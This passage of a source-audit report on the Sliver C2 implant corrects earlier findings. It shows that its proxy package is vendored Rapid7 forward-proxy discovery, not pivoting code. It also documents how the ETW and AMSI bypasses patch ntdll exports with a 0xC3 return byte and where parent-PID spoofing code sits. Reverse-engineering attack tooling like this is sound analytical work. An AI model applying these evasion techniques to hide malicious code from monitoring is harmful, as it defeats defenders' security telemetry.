**Nothing in the tree contradicts D1 §7's negative.** No SSN resolution exists in Sliver's source. **Two apparent contradictions (141 `SSN` hits, 2 `Halo` hits) were both substring false positives, and both were killed by controls rather than by judgement.**

---

## 7. `proxy/` — THE PREMISE IS WRONG

**task-29 called this "the largest untouched first-party dir" and asked "what primitives does an implant get for pivoting?" Neither framing survives contact with the directory.**

### 7.1 Inventory — recomputed

| File | Bytes | Kind |
|---|---|---|
| `provider_windows.go` | 15,199 | impl |
| `provider.go` | 15,122 | interface |
| `provider_test.go` | 12,898 | test |
| `provider_darwin_test.go` | 10,475 | test |
| `provider_generic.go` | 10,329 | impl |
| `provider_darwin.go` | 10,283 | impl |
| `url_test.go` | 8,254 | test |
| `proxy_test.go` | 8,133 | test |
| `proxy.go` | 5,542 | impl |
| `url.go` | 5,179 | impl |
| `provider_windows_test.go` | 3,712 | test |
| `provider_linux.go` | 3,630 | impl |
| `LICENSE.txt` | 1,552 | **licence** |
| `README.md` | 1,293 | docs |
| `doc.go` | 1,204 | docs |
| `test_helpers_test.go` | 464 | test |
| **Total** | **113,269** | **16 files** |

[source: `Get-ChildItem -Recurse -File` sorted by length + `Measure-Object -Sum`]

**Non-test: 10 files / 69,333 B. Test: 6 files / 43,936 B.** **task-29's "14 files / 107.8 KB" is low by two files and ~5.5 KB**, and the missing three are `LICENSE.txt`, `README.md`, and `doc.go` — **the exact files that establish the package's origin and purpose.**

### 7.2 Not first-party

```
implant/sliver/proxy/LICENSE.txt:1  Copyright (c) 2018, Rapid7, Inc.
implant/sliver/proxy/LICENSE.txt:2  All rights reserved.
```
[source: `implant/sliver/proxy/LICENSE.txt:1-2`]

**A Rapid7 copyright notice on a package inside a BishopFox tree is a vendoring declaration.** The package is checked in as source rather than under `vendor/`, which is why a directory listing cannot distinguish it from first-party code — **the licence file is the only signal, and it was one of the two files the brief's count missed.**

### 7.3 Not pivoting

```go
// Package proxy allows you to retrieve a system configured proxy for a given protocol and target URL.
//
// The priority of retrieval is the following:
//
// 	Windows:
//		Configuration File
//		Environment Variable: HTTPS_PROXY, HTTP_PROXY, FTP_PROXY, or ALL_PROXY. `NO_PROXY` is respected.
//		Internet Options: Automatically detect settings (WPAD)
//		Internet Options: Use automatic configuration script (PAC)
//		Internet Options: Manual proxy server
//		WINHTTP: (netsh winhttp)
```
[source: `implant/sliver/proxy/doc.go:1-11`]

**The package resolves the host's configured *forward* proxy so the implant can traverse it when dialling its C2.** Its identifiers say so — `URL`, `provider`, `Protocol` — and its Windows implementation reads **registry Internet Settings, environment variables, WPAD, PAC, and `netsh winhttp`** output. [source: `doc.go:1-11`; `provider_windows.go`]

**"Pivoting" in this corpus means the implant acting as a network relay for operator traffic** — that is `transports/pivotclients/` (D1 §11) and the `pivot-handlers.go` / `tun-rportfwd.go` maps (D15 §4.2). **`proxy/` moves the implant's own outbound C2 traffic through an existing corporate proxy. Those are different capabilities with different trust directions**, and the brief's conflation of them is the substance of this correction.

### 7.4 Single import site

**`proxy/` is imported at exactly one place in the entire non-vendor tree:**

```
implant/sliver/transports/httpclient/gohttp.go:34   "github.com/bishopfox/sliver/implant/sliver/proxy"
```
[source: `Select-String 'sliver/proxy"'` across the non-vendor tree — **1 hit**]

**Positive control:** the same probe run for `sliver/transports` returns multiple hits across the implant, confirming the pattern matches real import lines. The `proxy` import is genuinely singular.

**So the package's entire first-party role is: the HTTP(S) transport can ask "what proxy does this host use?" before dialling.** `gohttp.go` is the implant's HTTP C2 client. **This is a C2-transport convenience, not an operator capability — no handler, no message constant, and no RPC exposes it to an operator.**

### 7.5 Which platform implementations exist

| Provider | File | Bytes |
|---|---|---|
| Windows | `provider_windows.go` | 15,199 |
| Darwin | `provider_darwin.go` | 10,283 |
| Generic (fallback) | `provider_generic.go` | 10,329 |
| Linux | `provider_linux.go` | 3,630 |

[source: `Get-ChildItem implant/sliver/proxy/`]

**Linux's provider is the smallest by a factor of three** — consistent with `doc.go`'s priority list, which enumerates Windows mechanisms in detail and Linux's environment-variable path being the whole implementation. **Darwin's is large because it reads `scutil`/SystemConfiguration state; the generic provider is the non-specialised fallback the README names.** [source: `README.md`; `doc.go`]

**Test coverage is heavy relative to implementation — 6 test files, 43,936 B, 64% of the package by size** — which is normal for vendored library code and reinforces §7.2.

---

## 8. RESIDUAL UNKNOWNS, CORRECTIONS, AND COVERAGE

### 8.1 Corrections to task-29's premises

| # | task-29 states | Disk | § |
|---|---|---|---|
| C1 | `taskrunner/` = 7 files / 34.4 KB | **7 files / 35,203 B** — count right, bytes low by ~750 B | §4.1 |
| C2 | `proxy/` = 14 files / 107.8 KB | **16 files / 113,269 B** | §7.1 |
| C3 | `proxy/` is first-party | **vendored Rapid7 (`LICENSE.txt:1`)** | §7.2 |
| C4 | `proxy/` provides "primitives for pivoting" | **forward-proxy discovery for the C2 HTTP client** | §7.3 |
| C5 | "the largest untouched first-party dir" | `handlers/` and `tunnel_handlers/` are both larger; `proxy/`'s non-test footprint is **69,333 B / 10 files** | §7.1 |

**C3 and C4 are the substantive ones.** C1/C2 are count corrections; C3/C4 change what the section *is*. **C5 matters because "largest untouched" was the stated reason to spend a section on it** — on a non-test basis it is smaller than D15's already-covered handler block, and it is not first-party.

### 8.2 Corrections to D15, recorded in place

| # | D15 states | More precisely | § |
|---|---|---|---|
| D1 | U1: `EtwBypass` consumer unexamined | **`patchEtw()` at `:240`, called `:280`, patches `ntdll!EtwEventWrite` with `0xC3`** | §2 |
| D2 | "`syscalls/` … all mkwinsyscall kernel32 bindings" | **42 bindings across 7 DLLs, 2 of them `ntdll`**, all via `NewLazy*DLL().NewProc()` | §6.7 |
| D3 | The `0xC3` patch is "crude" | **the mechanism is crude; the surrounding code is careful** — skip-if-patched check and page-protection restore in both patches | §3.1 |
| D4 | AMSI bypass is "the least sophisticated evasion in the corpus's Sliver side" | **it disables 3 exports to ETW's 1** — the AMSI patch is the *broader* of the two, not merely cruder | §3.3 |
| D5 | `handle`/ppid path described from the handler layer | **`Sideload` explicitly discards ppid on Linux/Darwin (`_ uint32`)** — capability is Windows-only by signature | §4.3 |

**D1 is a closure of D15's own residual, not a contradiction.** D2 is a refinement that strengthens D15's conclusion. **D3 and D4 are the interesting ones: D15 read the mechanism and correctly called it crude, but did not compare the two patches, so it missed that the AMSI patch has the *wider* blast radius.** D5 is new.

**D15 is not being edited** per the task constraint; these are recorded here.

### 8.3 Residual unknowns

**U1 — `refresh()`'s mechanism (`task_windows.go:413`).** Read as a name and a position (between `Sideload` and `startProcess`, both ppid-aware) but its body was not read. **Its role in parent-PID spoofing is inferred from adjacency, and that inference is labelled as such.** [source: `task_windows.go:408, 413, 438`]

**U2 — `DuplicateHandle`'s intent at `task_windows.go:313`.** The argument order duplicates the *current process* pseudo-handle into the *current process*, which is not the conventional injection pattern. **Why is not established from this call alone**, and no technique is named for it. §5.3.

**U3 — `protectAndExec`'s argument block layout.** `protectAndExec` takes `startAddr`, `threadStartAddr`, `argAddr` and `convertIntToByteArr` encodes a number [source: `:509, :530`]. **The block's structure, and what `SpawnDll`/`Sideload` place in it, was not traced.**

**U4 — the `--etw-bypass` / `--in-process` guard's error text.** The guard exists at two client call sites [source: `execute-assembly.go:75`, `load.go:392`], but **the error the operator receives when they request `--etw-bypass` without `--in-process` was not read.**

**U5 — `dotnet_windows.go`'s CLR hosting was not reversed.** 5 functions / 2,618 B, including `LoadAssembly` `:50` and `GetRuntimeHost` `:32`. **The in-process assembly load path terminates here and its CLR bootstrap is unexamined.** D15 §7.1 cited `LoadAssembly` as the terminal call without reading it.

**U6 — `provider_windows.go`'s registry and WPAD mechanics were not read.** §7.5 establishes which platform implementations exist and their sizes; **the Windows provider's actual registry keys, PAC/WPAD handling, and priority resolution were not traced.** The package's *purpose* is established from `doc.go`; its *internals* are not.

**U7 — `matcher/` and the other D15 context directories remain out of D19 scope** and are unchanged from D15's coverage statement.

### 8.4 Coverage boundary

**Covered in full:**
- The `EtwBypass` chain, client flag → RPC field → handler argument → `patchEtw()` → `ntdll!EtwEventWrite`. **U1 from D15 is closed.**
- Both `0xC3` patches, read verbatim, structurally compared.
- All **37** `taskrunner/` functions enumerated by name and line; the injection chain read call-by-call.
- The `syscalls/` question answered by two independent methods with three biting negative controls.
- `proxy/`'s provenance, purpose, single import site, and platform breakdown.

**Not covered:** the six residuals above. **The largest unexamined blocks are `dotnet_windows.go`'s CLR hosting (U5) and `provider_windows.go`'s proxy resolution (U6).**

**This is a report on `taskrunner/`'s execution and patching surface and on `proxy/`'s identity.** It is not a reversal of the CLR bootstrap, and it is not a reversal of the proxy provider internals.

### 8.5 The headline, stated once

**D15's U1 was correct and is now closed: Sliver's ETW bypass is a second `byte(0xC3)` patch, at `task_windows.go:240`, applied to `ntdll.dll!EtwEventWrite` when the operator passes `--etw-bypass` together with `--in-process`.** It is the same idiom as the AMSI patch — same byte, same skip-check, same `VirtualProtect` bracket, and the same misspelled `"restauring"` in the failure string that shows one was copied from the other. **The AMSI patch disables three exports; the ETW patch disables one, and no other ETW function is patched anywhere in the tree.**

**And the two premises task-29 asked me to check most carefully were one right and one wrong: the `EtwBypass` consumer was exactly where D15 predicted, and `proxy/` is neither first-party nor about pivoting.**

---

*End of D19.*
